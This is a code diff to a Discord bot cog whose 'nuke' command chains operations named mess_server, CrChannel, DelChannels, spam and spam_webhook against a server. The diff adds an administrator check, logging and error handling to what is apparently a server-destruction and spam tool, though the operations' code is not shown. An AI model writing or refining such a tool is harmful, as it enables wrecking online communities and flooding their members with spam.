@@ -1,6 +1,7 @@
 from __future__ import annotations
 import asyncio
-import time
+import logging
+import traceback
 import discord
 from discord.ext import commands
 
@@ -11,23 +12,46 @@ from core.operations import Operations
 class Nuke(commands.Cog):
     def __init__(self, bot: commands.Bot):
         self.bot = bot
-        self.operations: Operations = bot.operations
+        self.operations: Operations | None = getattr(bot, "operations", None)
 
     @commands.command(name="nuke")
+    @commands.has_permissions(administrator=True)
+    @commands.guild_only()
     async def nuke(self, ctx: commands.Context) -> None:
         guild = ctx.guild
+        logging.info(f"[nuke] invoked by {ctx.author} in {guild} ({guild.id})")
+
         if not self.operations:
-            await ctx.reply("operations not initialized", delete_after=5)
             return
 
         try:
+            logging.info(f"[nuke] mess_server -> {guild.id}")
             await self.operations.mess_server(guild)
+
+            logging.info(f"[nuke] CrChannel -> {guild.id}")
             await self.operations.CrChannel(guild)
+
+            logging.info(f"[nuke] DelChannels -> {guild.id}")
             await self.operations.DelChannels(guild)
+
+            logging.info(f"[nuke] spam -> {guild.id}")
             await self.operations.spam(guild)
+
+            logging.info(f"[nuke] spam_webhook -> {guild.id}")
             await self.operations.spam_webhook(guild)
+
+            logging.info(f"[nuke] done")
         except Exception as e:
-            pass
+            tb = traceback.format_exc()
+            logging.error(f"[nuke] failed: {e}\n{tb}")
+
+    @nuke.error
+    async def nuke_error(self, ctx: commands.Context, error):
+        if isinstance(error, commands.MissingPermissions):
+            await ctx.reply("you need administrator for this", delete_after=5)
+        else:
+            logging.error(f"[nuke] command error: {error}")
+
 
 async def setup(bot: commands.Bot) -> None:
     if not hasattr(bot.http, "fast_limiter"):
